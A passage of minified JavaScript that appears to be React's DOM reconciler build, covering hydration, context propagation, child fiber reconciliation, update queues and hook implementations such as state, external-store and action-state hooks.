Jg(o){for(;o===gm;)gm=Ml[--Nl],Ml[Nl]=null,Pu=Ml[--Nl],Ml[Nl]=null;for(;o===cs;)cs=Bn[--Fn],Bn[Fn]=null,Wi=Bn[--Fn],Bn[Fn]=null,Ji=Bn[--Fn],Bn[Fn]=null}function tC(o,s){Bn[Fn++]=Ji,Bn[Fn++]=Wi,Bn[Fn++]=cs,Ji=s.id,Wi=s.overflow,cs=o}var Mt=null,ka=null,fa=!1,us=null,Vn=!1,Wg=Error(n(519));function ds(o){var s=Error(n(418,1<arguments.length&&arguments[1]!==void 0&&arguments[1]?"text":"HTML",""));throw Lu(zn(s,o)),Wg}function nC(o){var s=o.stateNode,c=o.type,m=o.memoizedProps;switch(s[it]=o,s[Tt]=m,c){case"dialog":oa("cancel",s),oa("close",s);break;case"iframe":case"object":case"embed":oa("load",s);break;case"video":case"audio":for(c=0;c<Ku.length;c++)oa(Ku[c],s);break;case"source":oa("error",s);break;case"img":case"image":case"link":oa("error",s),oa("load",s);break;case"details":oa("toggle",s);break;case"input":oa("invalid",s),Kp(s,m.value,m.defaultValue,m.checked,m.defaultChecked,m.type,m.name,!0);break;case"select":oa("invalid",s);break;case"textarea":oa("invalid",s),ts(s,m.value,m.defaultValue,m.children)}c=m.children,typeof c!="string"&&typeof c!="number"&&typeof c!="bigint"||s.textContent===""+c||m.suppressHydrationWarning===!0||Ex(s.textContent,c)?(m.popover!=null&&(oa("beforetoggle",s),oa("toggle",s)),m.onScroll!=null&&oa("scroll",s),m.onScrollEnd!=null&&oa("scrollend",s),m.onClick!=null&&(s.onclick=ri),s=!0):s=!1,s||ds(o,!0)}function iC(o){for(Mt=o.return;Mt;)switch(Mt.tag){case 5:case 31:case 13:Vn=!1;return;case 27:case 3:Vn=!0;return;default:Mt=Mt.return}}function _l(o){if(o!==Mt)return!1;if(!fa)return iC(o),fa=!0,!1;var s=o.tag,c;if((c=s!==3&&s!==27)&&((c=s===5)&&(c=o.type,c=!(c!=="form"&&c!=="button")||pv(o.type,o.memoizedProps)),c=!c),c&&ka&&ds(o),iC(o),s===13){if(o=o.memoizedState,o=o!==null?o.dehydrated:null,!o)throw Error(n(317));ka=Ix(o)}else if(s===31){if(o=o.memoizedState,o=o!==null?o.dehydrated:null,!o)throw Error(n(317));ka=Ix(o)}else s===27?(s=ka,As(o.type)?(o=bv,bv=null,ka=o):ka=s):ka=Mt?Gn(o.stateNode.nextSibling):null;return!0}function Rr(){ka=Mt=null,fa=!1}function Kg(){var o=us;return o!==null&&(dn===null?dn=o:dn.push.apply(dn,o),us=null),o}function Lu(o){us===null?us=[o]:us.push(o)}var Yg=J(null),Ir=null,So=null;function ps(o,s,c){B(Yg,s._currentValue),s._currentValue=c}function Co(o){o._currentValue=Yg.current,de(Yg)}function $g(o,s,c){for(;o!==null;){var m=o.alternate;if((o.childLanes&s)!==s?(o.childLanes|=s,m!==null&&(m.childLanes|=s)):m!==null&&(m.childLanes&s)!==s&&(m.childLanes|=s),o===c)break;o=o.return}}function Xg(o,s,c,m){var v=o.child;for(v!==null&&(v.return=o);v!==null;){var y=v.dependencies;if(y!==null){var x=v.child;y=y.firstContext;e:for(;y!==null;){var D=y;y=v;for(var K=0;K<s.length;K++)if(D.context===s[K]){y.lanes|=c,D=y.alternate,D!==null&&(D.lanes|=c),$g(y.return,c,o),m||(x=null);break e}y=D.next}}else if(v.tag===18){if(x=v.return,x===null)throw Error(n(341));x.lanes|=c,y=x.alternate,y!==null&&(y.lanes|=c),$g(x,c,o),x=null}else x=v.child;if(x!==null)x.return=v;else for(x=v;x!==null;){if(x===o){x=null;break}if(v=x.sibling,v!==null){v.return=x.return,x=v;break}x=x.return}v=x}}function ql(o,s,c,m){o=null;for(var v=s,y=!1;v!==null;){if(!y){if((v.flags&524288)!==0)y=!0;else if((v.flags&262144)!==0)break}if(v.tag===10){var x=v.alternate;if(x===null)throw Error(n(387));if(x=x.memoizedProps,x!==null){var D=v.type;Sn(v.pendingProps.value,x.value)||(o!==null?o.push(D):o=[D])}}else if(v===Xe.current){if(x=v.alternate,x===null)throw Error(n(387));x.memoizedState.memoizedState!==v.memoizedState.memoizedState&&(o!==null?o.push(ed):o=[ed])}v=v.return}o!==null&&Xg(s,o,c,m),s.flags|=262144}function bm(o){for(o=o.firstContext;o!==null;){if(!Sn(o.context._currentValue,o.memoizedValue))return!0;o=o.next}return!1}function wr(o){Ir=o,So=null,o=o.dependencies,o!==null&&(o.firstContext=null)}function Nt(o){return oC(Ir,o)}function vm(o,s){return Ir===null&&wr(o),oC(o,s)}function oC(o,s){var c=s._currentValue;if(s={context:s,memoizedValue:c,next:null},So===null){if(o===null)throw Error(n(308));So=s,o.dependencies={lanes:0,firstContext:s},o.flags|=524288}else So=So.next=s;return c}var Nq=typeof AbortController<"u"?AbortController:function(){var o=[],s=this.signal={aborted:!1,addEventListener:function(c,m){o.push(m)}};this.abort=function(){s.aborted=!0,o.forEach(function(c){return c()})}},_q=a.unstable_scheduleCallback,qq=a.unstable_NormalPriority,rt={$$typeof:k,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function Zg(){return{controller:new Nq,data:new Map,refCount:0}}function Ru(o){o.refCount--,o.refCount===0&&_q(qq,function(){o.controller.abort()})}var Iu=null,eb=0,kl=0,Ol=null;function kq(o,s){if(Iu===null){var c=Iu=[];eb=0,kl=nv(),Ol={status:"pending",value:void 0,then:function(m){c.push(m)}}}return eb++,s.then(sC,sC),s}function sC(){if(--eb===0&&Iu!==null){Ol!==null&&(Ol.status="fulfilled");var o=Iu;Iu=null,kl=0,Ol=null;for(var s=0;s<o.length;s++)(0,o[s])()}}function Oq(o,s){var c=[],m={status:"pending",value:null,reason:null,then:function(v){c.push(v)}};return o.then(function(){m.status="fulfilled",m.value=s;for(var v=0;v<c.length;v++)(0,c[v])(s)},function(v){for(m.status="rejected",m.reason=v,v=0;v<c.length;v++)(0,c[v])(void 0)}),m}var rC=Z.S;Z.S=function(o,s){HT=ht(),typeof s=="object"&&s!==null&&typeof s.then=="function"&&kq(o,s),rC!==null&&rC(o,s)};var jr=J(null);function ab(){var o=jr.current;return o!==null?o:Ma.pooledCache}function ym(o,s){s===null?B(jr,jr.current):B(jr,s.pool)}function lC(){var o=ab();return o===null?null:{parent:rt._currentValue,pool:o}}var Ul=Error(n(460)),tb=Error(n(474)),Em=Error(n(542)),Sm={then:function(){}};function cC(o){return o=o.status,o==="fulfilled"||o==="rejected"}function uC(o,s,c){switch(c=o[c],c===void 0?o.push(s):c!==s&&(s.then(ri,ri),s=c),s.status){case"fulfilled":return s.value;case"rejected":throw o=s.reason,pC(o),o;default:if(typeof s.status=="string")s.then(ri,ri);else{if(o=Ma,o!==null&&100<o.shellSuspendCounter)throw Error(n(482));o=s,o.status="pending",o.then(function(m){if(s.status==="pending"){var v=s;v.status="fulfilled",v.value=m}},function(m){if(s.status==="pending"){var v=s;v.status="rejected",v.reason=m}})}switch(s.status){case"fulfilled":return s.value;case"rejected":throw o=s.reason,pC(o),o}throw Mr=s,Ul}}function Dr(o){try{var s=o._init;return s(o._payload)}catch(c){throw c!==null&&typeof c=="object"&&typeof c.then=="function"?(Mr=c,Ul):c}}var Mr=null;function dC(){if(Mr===null)throw Error(n(459));var o=Mr;return Mr=null,o}function pC(o){if(o===Ul||o===Em)throw Error(n(483))}var zl=null,wu=0;function Cm(o){var s=wu;return wu+=1,zl===null&&(zl=[]),uC(zl,o,s)}function ju(o,s){s=s.props.ref,o.ref=s!==void 0?s:null}function Tm(o,s){throw s.$$typeof===E?Error(n(525)):(o=Object.prototype.toString.call(s),Error(n(31,o==="[object Object]"?"object with keys {"+Object.keys(s).join(", ")+"}":o)))}function mC(o){function s(ae,$){if(o){var ie=ae.deletions;ie===null?(ae.deletions=[$],ae.flags|=16):ie.push($)}}function c(ae,$){if(!o)return null;for(;$!==null;)s(ae,$),$=$.sibling;return null}function m(ae){for(var $=new Map;ae!==null;)ae.key!==null?$.set(ae.key,ae):$.set(ae.index,ae),ae=ae.sibling;return $}function v(ae,$){return ae=yo(ae,$),ae.index=0,ae.sibling=null,ae}function y(ae,$,ie){return ae.index=ie,o?(ie=ae.alternate,ie!==null?(ie=ie.index,ie<$?(ae.flags|=67108866,$):ie):(ae.flags|=67108866,$)):(ae.flags|=1048576,$)}function x(ae){return o&&ae.alternate===null&&(ae.flags|=67108866),ae}function D(ae,$,ie,ge){return $===null||$.tag!==6?($=Hg(ie,ae.mode,ge),$.return=ae,$):($=v($,ie),$.return=ae,$)}function K(ae,$,ie,ge){var Ue=ie.type;return Ue===j?he(ae,$,ie.props.children,ge,ie.key):$!==null&&($.elementType===Ue||typeof Ue=="object"&&Ue!==null&&Ue.$$typeof===M&&Dr(Ue)===$.type)?($=v($,ie.props),ju($,ie),$.return=ae,$):($=hm(ie.type,ie.key,ie.props,null,ae.mode,ge),ju($,ie),$.return=ae,$)}function oe(ae,$,ie,ge){return $===null||$.tag!==4||$.stateNode.containerInfo!==ie.containerInfo||$.stateNode.implementation!==ie.implementation?($=Gg(ie,ae.mode,ge),$.return=ae,$):($=v($,ie.children||[]),$.return=ae,$)}function he(ae,$,ie,ge,Ue){return $===null||$.tag!==7?($=Lr(ie,ae.mode,ge,Ue),$.return=ae,$):($=v($,ie),$.return=ae,$)}function be(ae,$,ie){if(typeof $=="string"&&$!==""||typeof $=="number"||typeof $=="bigint")return $=Hg(""+$,ae.mode,ie),$.return=ae,$;if(typeof $=="object"&&$!==null){switch($.$$typeof){case C:return ie=hm($.type,$.key,$.props,null,ae.mode,ie),ju(ie,$),ie.return=ae,ie;case A:return $=Gg($,ae.mode,ie),$.return=ae,$;case M:return $=Dr($),be(ae,$,ie)}if(me($)||V($))return $=Lr($,ae.mode,ie,null),$.return=ae,$;if(typeof $.then=="function")return be(ae,Cm($),ie);if($.$$typeof===k)return be(ae,vm(ae,$),ie);Tm(ae,$)}return null}function se(ae,$,ie,ge){var Ue=$!==null?$.key:null;if(typeof ie=="string"&&ie!==""||typeof ie=="number"||typeof ie=="bigint")return Ue!==null?null:D(ae,$,""+ie,ge);if(typeof ie=="object"&&ie!==null){switch(ie.$$typeof){case C:return ie.key===Ue?K(ae,$,ie,ge):null;case A:return ie.key===Ue?oe(ae,$,ie,ge):null;case M:return ie=Dr(ie),se(ae,$,ie,ge)}if(me(ie)||V(ie))return Ue!==null?null:he(ae,$,ie,ge,null);if(typeof ie.then=="function")return se(ae,$,Cm(ie),ge);if(ie.$$typeof===k)return se(ae,$,vm(ae,ie),ge);Tm(ae,ie)}return null}function ue(ae,$,ie,ge,Ue){if(typeof ge=="string"&&ge!==""||typeof ge=="number"||typeof ge=="bigint")return ae=ae.get(ie)||null,D($,ae,""+ge,Ue);if(typeof ge=="object"&&ge!==null){switch(ge.$$typeof){case C:return ae=ae.get(ge.key===null?ie:ge.key)||null,K($,ae,ge,Ue);case A:return ae=ae.get(ge.key===null?ie:ge.key)||null,oe($,ae,ge,Ue);case M:return ge=Dr(ge),ue(ae,$,ie,ge,Ue)}if(me(ge)||V(ge))return ae=ae.get(ie)||null,he($,ae,ge,Ue,null);if(typeof ge.then=="function")return ue(ae,$,ie,Cm(ge),Ue);if(ge.$$typeof===k)return ue(ae,$,ie,vm($,ge),Ue);Tm($,ge)}return null}function Me(ae,$,ie,ge){for(var Ue=null,Ea=null,qe=$,aa=$=0,ca=null;qe!==null&&aa<ie.length;aa++){qe.index>aa?(ca=qe,qe=null):ca=qe.sibling;var Sa=se(ae,qe,ie[aa],ge);if(Sa===null){qe===null&&(qe=ca);break}o&&qe&&Sa.alternate===null&&s(ae,qe),$=y(Sa,$,aa),Ea===null?Ue=Sa:Ea.sibling=Sa,Ea=Sa,qe=ca}if(aa===ie.length)return c(ae,qe),fa&&Eo(ae,aa),Ue;if(qe===null){for(;aa<ie.length;aa++)qe=be(ae,ie[aa],ge),qe!==null&&($=y(qe,$,aa),Ea===null?Ue=qe:Ea.sibling=qe,Ea=qe);return fa&&Eo(ae,aa),Ue}for(qe=m(qe);aa<ie.length;aa++)ca=ue(qe,ae,aa,ie[aa],ge),ca!==null&&(o&&ca.alternate!==null&&qe.delete(ca.key===null?aa:ca.key),$=y(ca,$,aa),Ea===null?Ue=ca:Ea.sibling=ca,Ea=ca);return o&&qe.forEach(function(ws){return s(ae,ws)}),fa&&Eo(ae,aa),Ue}function Fe(ae,$,ie,ge){if(ie==null)throw Error(n(151));for(var Ue=null,Ea=null,qe=$,aa=$=0,ca=null,Sa=ie.next();qe!==null&&!Sa.done;aa++,Sa=ie.next()){qe.index>aa?(ca=qe,qe=null):ca=qe.sibling;var ws=se(ae,qe,Sa.value,ge);if(ws===null){qe===null&&(qe=ca);break}o&&qe&&ws.alternate===null&&s(ae,qe),$=y(ws,$,aa),Ea===null?Ue=ws:Ea.sibling=ws,Ea=ws,qe=ca}if(Sa.done)return c(ae,qe),fa&&Eo(ae,aa),Ue;if(qe===null){for(;!Sa.done;aa++,Sa=ie.next())Sa=be(ae,Sa.value,ge),Sa!==null&&($=y(Sa,$,aa),Ea===null?Ue=Sa:Ea.sibling=Sa,Ea=Sa);return fa&&Eo(ae,aa),Ue}for(qe=m(qe);!Sa.done;aa++,Sa=ie.next())Sa=ue(qe,ae,aa,Sa.value,ge),Sa!==null&&(o&&Sa.alternate!==null&&qe.delete(Sa.key===null?aa:Sa.key),$=y(Sa,$,aa),Ea===null?Ue=Sa:Ea.sibling=Sa,Ea=Sa);return o&&qe.forEach(function(Kk){return s(ae,Kk)}),fa&&Eo(ae,aa),Ue}function Da(ae,$,ie,ge){if(typeof ie=="object"&&ie!==null&&ie.type===j&&ie.key===null&&(ie=ie.props.children),typeof ie=="object"&&ie!==null){switch(ie.$$typeof){case C:e:{for(var Ue=ie.key;$!==null;){if($.key===Ue){if(Ue=ie.type,Ue===j){if($.tag===7){c(ae,$.sibling),ge=v($,ie.props.children),ge.return=ae,ae=ge;break e}}else if($.elementType===Ue||typeof Ue=="object"&&Ue!==null&&Ue.$$typeof===M&&Dr(Ue)===$.type){c(ae,$.sibling),ge=v($,ie.props),ju(ge,ie),ge.return=ae,ae=ge;break e}c(ae,$);break}else s(ae,$);$=$.sibling}ie.type===j?(ge=Lr(ie.props.children,ae.mode,ge,ie.key),ge.return=ae,ae=ge):(ge=hm(ie.type,ie.key,ie.props,null,ae.mode,ge),ju(ge,ie),ge.return=ae,ae=ge)}return x(ae);case A:e:{for(Ue=ie.key;$!==null;){if($.key===Ue)if($.tag===4&&$.stateNode.containerInfo===ie.containerInfo&&$.stateNode.implementation===ie.implementation){c(ae,$.sibling),ge=v($,ie.children||[]),ge.return=ae,ae=ge;break e}else{c(ae,$);break}else s(ae,$);$=$.sibling}ge=Gg(ie,ae.mode,ge),ge.return=ae,ae=ge}return x(ae);case M:return ie=Dr(ie),Da(ae,$,ie,ge)}if(me(ie))return Me(ae,$,ie,ge);if(V(ie)){if(Ue=V(ie),typeof Ue!="function")throw Error(n(150));return ie=Ue.call(ie),Fe(ae,$,ie,ge)}if(typeof ie.then=="function")return Da(ae,$,Cm(ie),ge);if(ie.$$typeof===k)return Da(ae,$,vm(ae,ie),ge);Tm(ae,ie)}return typeof ie=="string"&&ie!==""||typeof ie=="number"||typeof ie=="bigint"?(ie=""+ie,$!==null&&$.tag===6?(c(ae,$.sibling),ge=v($,ie),ge.return=ae,ae=ge):(c(ae,$),ge=Hg(ie,ae.mode,ge),ge.return=ae,ae=ge),x(ae)):c(ae,$)}return function(ae,$,ie,ge){try{wu=0;var Ue=Da(ae,$,ie,ge);return zl=null,Ue}catch(qe){if(qe===Ul||qe===Em)throw qe;var Ea=Cn(29,qe,null,ae.mode);return Ea.lanes=ge,Ea.return=ae,Ea}}}var Nr=mC(!0),fC=mC(!1),ms=!1;function nb(o){o.updateQueue={baseState:o.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function ib(o,s){o=o.updateQueue,s.updateQueue===o&&(s.updateQueue={baseState:o.baseState,firstBaseUpdate:o.firstBaseUpdate,lastBaseUpdate:o.lastBaseUpdate,shared:o.shared,callbacks:null})}function fs(o){return{lane:o,tag:0,payload:null,callback:null,next:null}}function hs(o,s,c){var m=o.updateQueue;if(m===null)return null;if(m=m.shared,(Ta&2)!==0){var v=m.pending;return v===null?s.next=s:(s.next=v.next,v.next=s),m.pending=s,s=fm(o),$S(o,null,c),s}return mm(o,m,s,c),fm(o)}function Du(o,s,c){if(s=s.updateQueue,s!==null&&(s=s.shared,(c&4194048)!==0)){var m=s.lanes;m&=o.pendingLanes,c|=m,s.lanes=c,ou(o,c)}}function ob(o,s){var c=o.updateQueue,m=o.alternate;if(m!==null&&(m=m.updateQueue,c===m)){var v=null,y=null;if(c=c.firstBaseUpdate,c!==null){do{var x={lane:c.lane,tag:c.tag,payload:c.payload,callback:null,next:null};y===null?v=y=x:y=y.next=x,c=c.next}while(c!==null);y===null?v=y=s:y=y.next=s}else v=y=s;c={baseState:m.baseState,firstBaseUpdate:v,lastBaseUpdate:y,shared:m.shared,callbacks:m.callbacks},o.updateQueue=c;return}o=c.lastBaseUpdate,o===null?c.firstBaseUpdate=s:o.next=s,c.lastBaseUpdate=s}var sb=!1;function Mu(){if(sb){var o=Ol;if(o!==null)throw o}}function Nu(o,s,c,m){sb=!1;var v=o.updateQueue;ms=!1;var y=v.firstBaseUpdate,x=v.lastBaseUpdate,D=v.shared.pending;if(D!==null){v.shared.pending=null;var K=D,oe=K.next;K.next=null,x===null?y=oe:x.next=oe,x=K;var he=o.alternate;he!==null&&(he=he.updateQueue,D=he.lastBaseUpdate,D!==x&&(D===null?he.firstBaseUpdate=oe:D.next=oe,he.lastBaseUpdate=K))}if(y!==null){var be=v.baseState;x=0,he=oe=K=null,D=y;do{var se=D.lane&-536870913,ue=se!==D.lane;if(ue?(la&se)===se:(m&se)===se){se!==0&&se===kl&&(sb=!0),he!==null&&(he=he.next={lane:0,tag:D.tag,payload:D.payload,callback:null,next:null});e:{var Me=o,Fe=D;se=s;var Da=c;switch(Fe.tag){case 1:if(Me=Fe.payload,typeof Me=="function"){be=Me.call(Da,be,se);break e}be=Me;break e;case 3:Me.flags=Me.flags&-65537|128;case 0:if(Me=Fe.payload,se=typeof Me=="function"?Me.call(Da,be,se):Me,se==null)break e;be=h({},be,se);break e;case 2:ms=!0}}se=D.callback,se!==null&&(o.flags|=64,ue&&(o.flags|=8192),ue=v.callbacks,ue===null?v.callbacks=[se]:ue.push(se))}else ue={lane:se,tag:D.tag,payload:D.payload,callback:D.callback,next:null},he===null?(oe=he=ue,K=be):he=he.next=ue,x|=se;if(D=D.next,D===null){if(D=v.shared.pending,D===null)break;ue=D,D=ue.next,ue.next=null,v.lastBaseUpdate=ue,v.shared.pending=null}}while(!0);he===null&&(K=be),v.baseState=K,v.firstBaseUpdate=oe,v.lastBaseUpdate=he,y===null&&(v.shared.lanes=0),Es|=x,o.lanes=x,o.memoizedState=be}}function hC(o,s){if(typeof o!="function")throw Error(n(191,o));o.call(s)}function gC(o,s){var c=o.callbacks;if(c!==null)for(o.callbacks=null,o=0;o<c.length;o++)hC(c[o],s)}var Bl=J(null),xm=J(0);function bC(o,s){o=jo,B(xm,o),B(Bl,s),jo=o|s.baseLanes}function rb(){B(xm,jo),B(Bl,Bl.current)}function lb(){jo=xm.current,de(Bl),de(xm)}var Tn=J(null),Hn=null;function gs(o){var s=o.alternate;B(Za,Za.current&1),B(Tn,o),Hn===null&&(s===null||Bl.current!==null||s.memoizedState!==null)&&(Hn=o)}function cb(o){B(Za,Za.current),B(Tn,o),Hn===null&&(Hn=o)}function vC(o){o.tag===22?(B(Za,Za.current),B(Tn,o),Hn===null&&(Hn=o)):bs()}function bs(){B(Za,Za.current),B(Tn,Tn.current)}function xn(o){de(Tn),Hn===o&&(Hn=null),de(Za)}var Za=J(0);function Am(o){for(var s=o;s!==null;){if(s.tag===13){var c=s.memoizedState;if(c!==null&&(c=c.dehydrated,c===null||hv(c)||gv(c)))return s}else if(s.tag===19&&(s.memoizedProps.revealOrder==="forwards"||s.memoizedProps.revealOrder==="backwards"||s.memoizedProps.revealOrder==="unstable_legacy-backwards"||s.memoizedProps.revealOrder==="together")){if((s.flags&128)!==0)return s}else if(s.child!==null){s.child.return=s,s=s.child;continue}if(s===o)break;for(;s.sibling===null;){if(s.return===null||s.return===o)return null;s=s.return}s.sibling.return=s.return,s=s.sibling}return null}var To=0,ea=null,wa=null,lt=null,Pm=!1,Fl=!1,_r=!1,Lm=0,_u=0,Vl=null,Uq=0;function Ka(){throw Error(n(321))}function ub(o,s){if(s===null)return!1;for(var c=0;c<s.length&&c<o.length;c++)if(!Sn(o[c],s[c]))return!1;return!0}function db(o,s,c,m,v,y){return To=y,ea=s,s.memoizedState=null,s.updateQueue=null,s.lanes=0,Z.H=o===null||o.memoizedState===null?aT:Pb,_r=!1,y=c(m,v),_r=!1,Fl&&(y=EC(s,c,m,v)),yC(o),y}function yC(o){Z.H=Ou;var s=wa!==null&&wa.next!==null;if(To=0,lt=wa=ea=null,Pm=!1,_u=0,Vl=null,s)throw Error(n(300));o===null||ct||(o=o.dependencies,o!==null&&bm(o)&&(ct=!0))}function EC(o,s,c,m){ea=o;var v=0;do{if(Fl&&(Vl=null),_u=0,Fl=!1,25<=v)throw Error(n(301));if(v+=1,lt=wa=null,o.updateQueue!=null){var y=o.updateQueue;y.lastEffect=null,y.events=null,y.stores=null,y.memoCache!=null&&(y.memoCache.index=0)}Z.H=tT,y=s(c,m)}while(Fl);return y}function zq(){var o=Z.H,s=o.useState()[0];return s=typeof s.then=="function"?qu(s):s,o=o.useState()[0],(wa!==null?wa.memoizedState:null)!==o&&(ea.flags|=1024),s}function pb(){var o=Lm!==0;return Lm=0,o}function mb(o,s,c){s.updateQueue=o.updateQueue,s.flags&=-2053,o.lanes&=~c}function fb(o){if(Pm){for(o=o.memoizedState;o!==null;){var s=o.queue;s!==null&&(s.pending=null),o=o.next}Pm=!1}To=0,lt=wa=ea=null,Fl=!1,_u=Lm=0,Vl=null}function Yt(){var o={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return lt===null?ea.memoizedState=lt=o:lt=lt.next=o,lt}function et(){if(wa===null){var o=ea.alternate;o=o!==null?o.memoizedState:null}else o=wa.next;var s=lt===null?ea.memoizedState:lt.next;if(s!==null)lt=s,wa=o;else{if(o===null)throw ea.alternate===null?Error(n(467)):Error(n(310));wa=o,o={memoizedState:wa.memoizedState,baseState:wa.baseState,baseQueue:wa.baseQueue,queue:wa.queue,next:null},lt===null?ea.memoizedState=lt=o:lt=lt.next=o}return lt}function Rm(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function qu(o){var s=_u;return _u+=1,Vl===null&&(Vl=[]),o=uC(Vl,o,s),s=ea,(lt===null?s.memoizedState:lt.next)===null&&(s=s.alternate,Z.H=s===null||s.memoizedState===null?aT:Pb),o}function Im(o){if(o!==null&&typeof o=="object"){if(typeof o.then=="function")return qu(o);if(o.$$typeof===k)return Nt(o)}throw Error(n(438,String(o)))}function hb(o){var s=null,c=ea.updateQueue;if(c!==null&&(s=c.memoCache),s==null){var m=ea.alternate;m!==null&&(m=m.updateQueue,m!==null&&(m=m.memoCache,m!=null&&(s={data:m.data.map(function(v){return v.slice()}),index:0})))}if(s==null&&(s={data:[],index:0}),c===null&&(c=Rm(),ea.updateQueue=c),c.memoCache=s,c=s.data[s.index],c===void 0)for(c=s.data[s.index]=Array(o),m=0;m<o;m++)c[m]=L;return s.index++,c}function xo(o,s){return typeof s=="function"?s(o):s}function wm(o){var s=et();return gb(s,wa,o)}function gb(o,s,c){var m=o.queue;if(m===null)throw Error(n(311));m.lastRenderedReducer=c;var v=o.baseQueue,y=m.pending;if(y!==null){if(v!==null){var x=v.next;v.next=y.next,y.next=x}s.baseQueue=v=y,m.pending=null}if(y=o.baseState,v===null)o.memoizedState=y;else{s=v.next;var D=x=null,K=null,oe=s,he=!1;do{var be=oe.lane&-536870913;if(be!==oe.lane?(la&be)===be:(To&be)===be){var se=oe.revertLane;if(se===0)K!==null&&(K=K.next={lane:0,revertLane:0,gesture:null,action:oe.action,hasEagerState:oe.hasEagerState,eagerState:oe.eagerState,next:null}),be===kl&&(he=!0);else if((To&se)===se){oe=oe.next,se===kl&&(he=!0);continue}else be={lane:0,revertLane:oe.revertLane,gesture:null,action:oe.action,hasEagerState:oe.hasEagerState,eagerState:oe.eagerState,next:null},K===null?(D=K=be,x=y):K=K.next=be,ea.lanes|=se,Es|=se;be=oe.action,_r&&c(y,be),y=oe.hasEagerState?oe.eagerState:c(y,be)}else se={lane:be,revertLane:oe.revertLane,gesture:oe.gesture,action:oe.action,hasEagerState:oe.hasEagerState,eagerState:oe.eagerState,next:null},K===null?(D=K=se,x=y):K=K.next=se,ea.lanes|=be,Es|=be;oe=oe.next}while(oe!==null&&oe!==s);if(K===null?x=y:K.next=D,!Sn(y,o.memoizedState)&&(ct=!0,he&&(c=Ol,c!==null)))throw c;o.memoizedState=y,o.baseState=x,o.baseQueue=K,m.lastRenderedState=y}return v===null&&(m.lanes=0),[o.memoizedState,m.dispatch]}function bb(o){var s=et(),c=s.queue;if(c===null)throw Error(n(311));c.lastRenderedReducer=o;var m=c.dispatch,v=c.pending,y=s.memoizedState;if(v!==null){c.pending=null;var x=v=v.next;do y=o(y,x.action),x=x.next;while(x!==v);Sn(y,s.memoizedState)||(ct=!0),s.memoizedState=y,s.baseQueue===null&&(s.baseState=y),c.lastRenderedState=y}return[y,m]}function SC(o,s,c){var m=ea,v=et(),y=fa;if(y){if(c===void 0)throw Error(n(407));c=c()}else c=s();var x=!Sn((wa||v).memoizedState,c);if(x&&(v.memoizedState=c,ct=!0),v=v.queue,Eb(xC.bind(null,m,v,o),[o]),v.getSnapshot!==s||x||lt!==null&&lt.memoizedState.tag&1){if(m.flags|=2048,Hl(9,{destroy:void 0},TC.bind(null,m,v,c,s),null),Ma===null)throw Error(n(349));y||(To&127)!==0||CC(m,s,c)}return c}function CC(o,s,c){o.flags|=16384,o={getSnapshot:s,value:c},s=ea.updateQueue,s===null?(s=Rm(),ea.updateQueue=s,s.stores=[o]):(c=s.stores,c===null?s.stores=[o]:c.push(o))}function TC(o,s,c,m){s.value=c,s.getSnapshot=m,AC(s)&&PC(o)}function xC(o,s,c){return c(function(){AC(s)&&PC(o)})}function AC(o){var s=o.getSnapshot;o=o.value;try{var c=s();return!Sn(o,c)}catch{return!0}}function PC(o){var s=Pr(o,2);s!==null&&pn(s,o,2)}function vb(o){var s=Yt();if(typeof o=="function"){var c=o;if(o=c(),_r){ya(!0);try{c()}finally{ya(!1)}}}return s.memoizedState=s.baseState=o,s.queue={pending:null,lanes:0,dispatch:null,lastRenderedReducer:xo,lastRenderedState:o},s}function LC(o,s,c,m){return o.baseState=c,gb(o,wa,typeof m=="function"?m:xo)}function Bq(o,s,c,m,v){if(Mm(o))throw Error(n(485));if(o=s.action,o!==null){var y={payload:v,action:o,next:null,isTransition:!0,status:"pending",value:null,reason:null,listeners:[],then:function(x){y.listeners.push(x)}};Z.T!==null?c(!0):y.isTransition=!1,m(y),c=s.pending,c===null?(y.next=s.pending=y,RC(s,y)):(y.next=c.next,s.pending=c.next=y)}}function RC(o,s){var c=s.action,m=s.payload,v=o.state;if(s.isTransition){var y=Z.T,x={};Z.T=x;try{var D=c(v,m),K=Z.S;K!==null&&K(x,D),IC(o,s,D)}catch(oe){yb(o,s,oe)}finally{y!==null&&x.types!==null&&(y.types=x.types),Z.T=y}}else try{y=c(v,m),IC(o,s,y)}catch(oe){yb(o,s,oe)}}function IC(o,s,c){c!==null&&typeof c=="object"&&typeof c.then=="function"?c.then(function(m){wC(o,s,m)},function(m){return yb(o,s,m)}):wC(o,s,c)}function wC(o,s,c){s.status="fulfilled",s.value=c,jC(s),o.state=c,s=o.pending,s!==null&&(c=s.next,c===s?o.pending=null:(c=c.next,s.next=c,RC(o,c)))}function yb(o,s,c){var m=o.pending;if(o.pending=null,m!==null){m=m.next;do s.status="rejected",s.reason=c,jC(s),s=s.next;while(s!==m)}o.action=null}function jC(o){o=o.listeners;for(var s=0;s<o.length;s++)(0,o[s])()}function DC(o,s){return s}function MC(o,s){if(fa){var c=Ma.formState;if(c!==null){e:{var m=ea;if(fa){if(ka){a:{for(var v=ka,y=Vn;v.nodeType!==8;){if(!y){v=null;break a}if(v=Gn(v.nextSibling),v===null){v=null;break a}}y=v.data,v=y==="F!"||y==="F"?v:null}if(v){ka=Gn(v.nextSibling),m=v.data==="F!";break e}}ds(m)}m=!1}m&&(s=c[0])}}return c=Yt(),c.memoizedState=c.baseState=s,m={pending:null,lanes:0,dispatch:null,lastRenderedReducer:DC,lastRenderedState:s},c.queue=m,c=XC.bind(null,ea,m),m.dispatch=c,m=vb(!1),y=Ab.bind(null,ea,!1,m.queue),m=Yt(),v={state:s,dispatch:null,action:o,pending:null},m.queue=v,c=Bq.bind(null,ea,v,y,c),v.dispatch=c,m.memoizedState=o,[s,c,!1]}function NC(o){var s=et();return _C(s,wa,o)}function _C(o,s,c){if(s=gb(o,s,DC)[0],o=wm(xo)[0],typeof s=="object"&&s!==null&&typeof s.then=="function")try{var m=qu(s)}catch(x){throw x===Ul?Em:x}else m=s;s=et();var v=s.queue,y=v.dispatch;return c!==s.memoizedState&&(ea.flags|=2048,Hl(9,{destroy:void 0},Fq.bind(null,v,c),null)),[m,y,o]}function Fq(o,s){o.action=s}function qC(o){var s=et(),c=wa;if(c!==null)return _C(s,c,o);et(),s=s.memoizedState,c=et();var m=c.queue.dispatch;return c.memoizedState=o,[s,m,!1]}function Hl(o,s,c,m){return 